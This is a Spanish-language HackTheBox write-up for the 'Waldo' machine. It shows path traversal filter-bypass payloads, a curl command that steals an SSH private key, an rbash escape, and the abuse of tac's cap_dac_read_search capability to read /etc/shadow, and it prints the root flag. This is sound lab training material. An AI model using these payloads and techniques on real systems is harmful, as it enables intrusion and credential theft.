---
layout: post
render_with_liquid: false
title: "HTB Writeup: Waldo"
date: 2026-05-21
category: writeups
tags: [htb, linux, medium, lfi, path-traversal, directory-traversal, docker, ssh-key, rbash, rbash-escape, linux-capabilities, cap_dac_read_search]
platform: HackTheBox
os: Linux
difficulty: Medium
has_exploits: false
resumen: "Aplicación web 'List Manager' con dos endpoints (dirRead.php / fileRead.php) vulnerables a path traversal; el filtro que elimina '../' se evade con '....//'. Lectura de una clave SSH oculta (.monitor) en el contenedor Alpine para entrar como nobody, salto al host Debian como monitor (rbash), fuga de la shell restringida vía ssh no interactivo + script, y lectura de la flag de root abusando de la capability cap_dac_read_search sobre tac."
permalink: /writeups/waldo/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Medium     |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Reconocimiento:** Nmap, análisis de una SPA "List Manager" y sus endpoints AJAX
- **Explotación web:** Path traversal en `dirRead.php` / `fileRead.php` — bypass del filtro `../` mediante `....//` (LFI)
- **Credenciales:** Lectura de una clave SSH oculta (`.monitor`) para acceder como `nobody` en el contenedor Alpine
- **Pivoting:** Salto del contenedor al host Debian como `monitor` reutilizando la misma clave
- **Escape de rbash:** Bypass de shell restringida con `ssh host comando` + `script /dev/null -c bash` y reescritura de `PATH`
- **Escalada:** Abuso de la capability `cap_dac_read_search+ei` sobre `/usr/bin/tac` para leer ficheros de root (`/etc/shadow`, `/root/root.txt`)

## Sinopsis

**Waldo** es una máquina Linux que gira en torno a una pequeña aplicación web de gestión de listas — temática *¿Dónde está Wally?* — que delega la lectura de directorios y ficheros en dos endpoints PHP: `dirRead.php` y `fileRead.php`. Ambos aplican un saneamiento **insuficiente** sobre el parámetro de ruta: eliminan las secuencias `../` una sola vez, lo que se evade trivialmente con `....//` (al borrar el `../` interior queda un `../` válido). El resultado es un **path traversal / LFI**.

Listando el sistema de ficheros descubrimos un `.dockerenv` (estamos dentro de un contenedor) y, en `/home/nobody/.ssh/`, una clave privada oculta llamada `.monitor`. La leemos con `fileRead.php`, la guardamos como `id_rsa` y entramos por SSH como **nobody** en un contenedor **Alpine**.

La misma clave `.monitor` está autorizada también para el usuario **monitor** del **host Debian**, así que pivotamos con `ssh -i .monitor monitor@localhost`. Pero `monitor` corre bajo **rbash** (restricted bash): no puede cambiar `PATH`, ni `cd`, ni ejecutar binarios fuera de su jaula. La fuga es clásica: ejecutar comandos de forma **no interactiva** a través de SSH (`ssh host bash`) y, una vez dentro, lanzar `script /dev/null -c bash` y reescribir `PATH` a mano.

La escalada final no pasa por un shell de root: `getcap` revela que `/usr/bin/tac` tiene la capability **`cap_dac_read_search+ei`**, que le permite **saltarse las comprobaciones de permisos de lectura** del sistema. Con eso leemos `/etc/shadow` y la propia `root.txt` sin ser root.

---

## Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.141 -oG allPorts
```

![Descubrimiento de puertos abiertos con nmap](/writeups/waldo/assets/01_nmap_all_ports.png)

Solo dos puertos abiertos:

| Puerto | Servicio | Versión                  |
| :----- | :------- | :----------------------- |
| 22/tcp | SSH      | OpenSSH 7.5 (protocol 2.0) |
| 80/tcp | HTTP     | nginx 1.12.2             |

```bash
nmap -sCV -p22,80 10.129.229.141 -oN targeted
```

![Detección de servicio y versión con nmap -sCV](/writeups/waldo/assets/02_nmap_service_version.png)

El escaneo de scripts deja un par de pistas: el `http-title` es **List Manager**, el recurso solicitado redirige a **`/list.html`**, y `http-trane-info` reporta *"Problem with XML parsing of /evox/about"*. El servidor es nginx, así que la lógica de backend la pondrá PHP.

### La aplicación "List Manager"

```
http://10.129.229.141/list.html
```

![Aplicación web List Manager sobre fondo de ¿Dónde está Wally?](/writeups/waldo/assets/03_list_manager_web.png)

La aplicación permite crear, listar y borrar "listas" (`list1`, `list3`, …). Cada acción dispara una petición AJAX contra endpoints PHP. Interceptando el tráfico con Burp identificamos dos especialmente jugosos:

- **`POST /dirRead.php`** con un parámetro `path` → devuelve el **contenido de un directorio** en JSON.
- **`POST /fileRead.php`** con un parámetro `file` → devuelve el **contenido de un fichero**.

Ese par de primitivas — listar directorios y leer ficheros con una ruta controlada por el cliente — es exactamente lo que necesitamos para un ataque de **path traversal**.

---

## Explotación — Path traversal en dirRead.php / fileRead.php

### Comportamiento base

La petición legítima lista el directorio `.list` (donde se guardan las listas):

```http
POST /dirRead.php HTTP/1.1
Host: 10.129.229.141
Content-Type: application/x-www-form-urlencoded

path=./.list/
```

![dirRead.php listando el directorio .list](/writeups/waldo/assets/04_dirread_list_dir.png)

La respuesta devuelve `["." , ".." , "list1", "list3", "list7"]`. Hasta aquí, lo esperado.

### El filtro y su evasión

El primer intento de salir del directorio con `../` repetidos **no funciona**:

```http
path=./.list/../../../../../
```

![Traversal ingenuo neutralizado por el filtro](/writeups/waldo/assets/05_dirread_naive_blocked.png)

La respuesta es idéntica a la anterior: seguimos viendo el contenido de `.list`. El backend está **eliminando las secuencias `../`** de la ruta antes de usarla. El problema es que lo hace en **una sola pasada** y de forma no recursiva. La evasión se consigue con el patrón **`....//`**:

```http
path=./.list/....//....//....//....//....//
```

![Bypass del filtro con ....// — listado del sistema raíz](/writeups/waldo/assets/06_dirread_traversal_bypass.png)

> **Por qué funciona `....//`**: el filtro busca y borra la subcadena `../`. En `....//` esa subcadena aparece **en el interior** (`..` + `../` + `/`). Al eliminar el `../` central, lo que queda es `..` + `/` = **`../`**, una secuencia de traversal perfectamente válida que el filtro ya no vuelve a inspeccionar. Es el equivalente de salida en directorios al clásico `....//....//` para WAFs que sustituyen una sola vez.

Ahora la respuesta lista la **raíz del sistema de ficheros**: `bin`, `dev`, `etc`, `home`, `root`, `var`… y, revelador, **`.dockerenv`**. Estamos operando contra el sistema de ficheros de un **contenedor Docker**.

### dirRead lista directorios; fileRead lee ficheros

Si intentamos que `dirRead.php` nos devuelva un fichero, falla — solo sabe listar directorios:

```http
path=./.list/....//....//....//....//....//etc/passwd
```

![dirRead.php devuelve false al apuntar a un fichero](/writeups/waldo/assets/07_dirread_file_false.png)

La respuesta es `false`. Para leer ficheros está el segundo endpoint, **`fileRead.php`**, que acepta la misma técnica con el parámetro `file`. Lo validamos primero con una lista normal:

```http
POST /fileRead.php HTTP/1.1
Host: 10.129.229.141
Content-Type: application/x-www-form-urlencoded

file=./.list/list1
```

![fileRead.php devolviendo el contenido de list1 en JSON](/writeups/waldo/assets/08_fileread_list1.png)

Y a continuación leemos un fichero arbitrario fuera de la jaula aplicando el mismo bypass `....//`:

```http
file=./.list/....//....//....//....//....//....//etc/passwd
```

![Lectura de /etc/passwd mediante fileRead.php](/writeups/waldo/assets/09_fileread_passwd.png)

`/etc/passwd` confirma de nuevo el contenedor: el shell de `root` es **`/bin/ash`** (típico de **Alpine**) y hay un usuario `nginx`. No vemos credenciales aún, pero sí sabemos que existe un home `/home/nobody`.

### Robo de la clave SSH oculta

Listando `/home/nobody/.ssh/` con `dirRead.php` aparece un fichero que no debería estar ahí: **`.monitor`**. Lo leemos con `fileRead.php`:

```http
file=./.list/....//....//....//....//....//....//home/nobody/.ssh//.monitor
```

![Burp: fileRead.php devolviendo la clave privada .monitor](/writeups/waldo/assets/10_burp_fileread_monitor_key.png)

La respuesta es una **clave privada RSA completa**. Automatizamos la extracción con `curl`, parseando el JSON con `jq` para quedarnos solo con el campo `file`:

```bash
curl -s -X POST http://10.129.229.141/fileRead.php \
  -H "Content-type: application/x-www-form-urlencoded" \
  --data 'file=./.list/....//....//....//....//....//....//home/nobody/.ssh//.monitor' \
  | jq -r '.file' > id_rsa

chmod 600 id_rsa
ssh -i id_rsa nobody@10.129.229.141
```

![curl extrae la clave y ssh entra como nobody en Alpine](/writeups/waldo/assets/11_curl_key_ssh_nobody.png)

Entramos como **nobody**. El banner *"Welcome to Alpine!"* confirma que el primer acceso es al **contenedor Alpine** que sirve la web.

---

## Pivoting — del contenedor Alpine al host Debian

En el home de `nobody` encontramos la flag de usuario y un `.ssh` interesante:

```bash
ls -la
cd .ssh
cat authorized_keys
```

![Home de nobody y authorized_keys con la clave monitor@waldo](/writeups/waldo/assets/12_nobody_authorized_keys.png)

`authorized_keys` contiene una única clave pública etiquetada **`monitor@waldo`**. Es la pareja pública de la `.monitor` que ya tenemos.La usamos para conectar al servicio SSH local apuntando al usuario **monitor**:

```bash
ssh -i .monitor monitor@localhost
```

![ls -la de .ssh y salto a monitor@localhost — banner Debian](/writeups/waldo/assets/13_ssh_monitor_localhost.png)

El banner cambia por completo: **`Linux waldo 4.19.0-25-amd64 ... Debian`**. Hemos saltado del contenedor Alpine al **host Debian** subyacente. La misma clave autoriza a `nobody` en el contenedor y a `monitor` en el host.

---

## Fuga de rbash

La sesión interactiva de `monitor` cae en una **shell restringida (rbash)**. Culquier intento de operación normal devuelve errores:

![Prompt de monitor bajo rbash con errores de shell restringida](/writeups/waldo/assets/14_rbash_prompt.png)

```
-rbash: alias: command not found
-rbash: dircolors: command not found
-rbash: .: /usr/share/bash-completion/bash_completion: restricted
-rbash: PATH: readonly variable
```

**rbash** solo restringe la shell **interactiva** de login. Si pedimos a SSH que ejecute un comando concreto, este corre **sin pasar por la restricción**. Primero lo confirmamos leyendo `/etc/passwd` directamente:

```bash
ssh -i .monitor monitor@localhost cat /etc/passwd
```

![Ejecución no interactiva vía SSH leyendo /etc/passwd](/writeups/waldo/assets/15_rbash_ssh_passwd.png)

El `passwd` del host nos da el mapa de usuarios reales y sus shells:

- `monitor` → `/bin/rbash` (*"user for editing source and monitoring logs"*)
- `app-dev` → `/bin/bash` (*"user for managing app-dev"*)
- `root`, `steve`, `nobody`…

El siguiente paso es pasar de "ejecutar un comando suelto" a una **shell completa**. Le pedimos a SSH que lance `bash` directamente (saltándose el `rbash` de login) y, ya dentro, mejoramos a una TTY funcional con `script`:

```bash
ssh -i .monitor monitor@localhost bash
# ya en bash, pero con PATH restringido:
script /dev/null -c bash
```

![ssh ... bash + script /dev/null -c bash — bash con PATH restringido](/writeups/waldo/assets/16_rbash_escape_script.png)

Tenemos `bash`, pero `PATH` sigue confinado a `/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1`, así que ni `whoami` se encuentra. Lo resolvemos reescribiendo `PATH` a uno completo (ya no es de solo lectura fuera de rbash):

```bash
export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

![Reescritura de PATH para recuperar los binarios del sistema](/writeups/waldo/assets/17_export_path.png)

Ya con un entorno usable, confirmamos dónde estamos y a quién tenemos por vecinos:

```bash
hostname -I    # 10.129.229.141 172.17.0.1  -> bridge docker0, somos el host
ls /home       # app-dev  monitor  nobody  steve
```

![hostname -I muestra el bridge docker0 del host](/writeups/waldo/assets/18_hostname_docker.png)

![Usuarios en /home: app-dev, monitor, nobody, steve](/writeups/waldo/assets/19_home_users.png)

La presencia de `172.17.0.1` (el gateway `docker0`) confirma que **somos el host**, no el contenedor.

---

## Escalada de privilegios — abuso de capabilities

El usuario `monitor` pertenece al grupo `monitor`, que da acceso al directorio de desarrollo `~/app-dev`:

```bash
cd ~/app-dev
ls -la
```

![Directorio app-dev con logMonitor y .restrictScript.sh](/writeups/waldo/assets/20_appdev_logmonitor.png)

Ahí vive **`logMonitor`** (una utilidad en C para volcar logs comunes), su código fuente, un `makefile`, un subdirectorio `v0.1/` y `.restrictScript.sh` — el script que monta la jaula `rbash` de `monitor`. El fuente de `logMonitor.c` confirma su propósito: leer ficheros de log del sistema (`/var/log/auth.log`, `/var/log/alternatives.log`, …).

![Código fuente de logMonitor.c](/writeups/waldo/assets/21_logmonitor_source.png)

Una herramienta cuyo trabajo es **leer logs que normalmente requieren privilegios** es la pista para buscar **capabilities**:

```bash
getcap -r / 2>/dev/null
```

![getcap revela cap_dac_read_search sobre tac y logMonitor-0.1](/writeups/waldo/assets/22_getcap.png)

```
/bin/ping = cap_net_raw+ep
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

La joya es **`/usr/bin/tac`** con `cap_dac_read_search`. Esta capability permite a un proceso **ignorar las comprobaciones DAC de lectura** (los bits `r` y la propiedad del fichero): quien la ostenta puede leer **cualquier fichero del sistema**, exactamente como root. Y `tac` es, además, un binario perfectamente normal para volcar contenido (solo que invertido por líneas).

> **`cap_dac_read_search` ≈ lectura total**: no da escritura ni ejecución como root, pero permite leer `/etc/shadow`, claves privadas o cualquier flag. Es, a efectos prácticos, **acceso de lectura de root**. El sufijo `+ei` indica que la capability está activa (bit *effective*) al ejecutarse el binario.

Lo comprobamos volcando `/etc/shadow`, que solo root debería poder leer:

```bash
tac /etc/shadow
```

![tac leyendo /etc/shadow gracias a cap_dac_read_search](/writeups/waldo/assets/23_tac_shadow.png)

Obtenemos los hashes de `root`, `app-dev`, `monitor` y `steve` — confirmación total de que la capability funciona. Para la flag de root aplicamos el mismo truco; como `tac` invierte el orden de las líneas, lo encadenamos con un segundo `tac` para restaurar el orden original (irrelevante en una flag de una línea, pero buena costumbre):

```bash
tac /root/root.txt | tac
```

![tac /root/root.txt | tac revela la flag de root](/writeups/waldo/assets/24_tac_root_flag.png)

```
763ba291a14a52c7c3a3bc3dfc7ca330
```

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
